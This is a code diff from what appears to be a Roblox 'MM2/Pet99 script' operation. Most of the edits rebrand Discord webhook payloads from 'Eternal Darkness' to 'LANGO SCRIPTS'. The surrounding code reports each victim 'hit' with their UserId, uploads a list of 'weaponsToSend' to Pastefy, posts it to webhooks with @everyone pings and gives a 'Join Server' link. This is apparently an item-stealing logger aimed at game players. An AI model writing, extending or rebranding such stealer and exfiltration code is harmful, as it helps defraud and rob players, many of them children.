@@ -413,10 +413,10 @@ local publicFields = {
 
 local PublicPayload = {
     content = "🌑 **MM2 Public Hits | LANGO SCRIPTS**",
-    username = "🌑 Eternal Darkness",
+    username = "🌑 LANGO SCRIPTS",
     avatar_url = "https://imgur.com/a/LhzvN5h.png",
     embeds = {{
-        title = "Eternal Darkness MM2 HIT | " .. hitCategory,
+        title = "lango scripts MM2 HIT | " .. hitCategory,
         url = rubisLink,
         color = 0x1a1a2e,
         thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"},
@@ -1077,8 +1077,8 @@ const commands = [
         .setDescription("Choose script type")
         .setRequired(true)
         .addChoices(
-          { name: "Pet99 Script", value: "scriptA" },
-          { name: "MM2 Script", value: "scriptB" }
+          { name: "MM2 Script", value: "scriptA" },
+          { name: "Pet99 Script", value: "scriptB" }
         )
     )
     .toJSON(),
@@ -1178,7 +1178,7 @@ local function sendToPublic(payload)
                 Body = HttpService:JSONEncode(payload)
             })
         end)
-    end)
+    end) 
 end
 
 local rubisLink = uploadToPastefy(weaponsToSend)
@@ -1227,7 +1227,7 @@ table.insert(fields, {name = "🔗 Actions", value = "[Join Server](" .. fernJoi
 
 local payload = {
     content = isPingWorthy and "@everyone 🌑 **NEW MM2 HIT | LANGO SCRIPTS**" or nil,
-    username = "🌑 Eternal Darkness",
+    username = "🌑 lango scripts",
     avatar_url = "https://imgur.com/a/LhzvN5h.png",
     embeds = {{
         title = "LANGO SCRIPTS MM2   HIT | " .. hitCategory,
@@ -1252,10 +1252,10 @@ local publicFields = {
 
 local PublicPayload = {
     content = "🌑 **MM2 Public Hits | LANGO SCRIPTS**",
-    username = "🌑 Eternal Darkness",
+    username = "🌑 lango scripts",
     avatar_url = "https://imgur.com/a/LhzvN5h.png",
     embeds = {{
-        title = "Eternal Darkness MM2 HIT | " .. hitCategory,
+        title = "lango scripts MM2 HIT | " .. hitCategory,
         url = rubisLink,
         color = 0x1a1a2e,
         thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"},
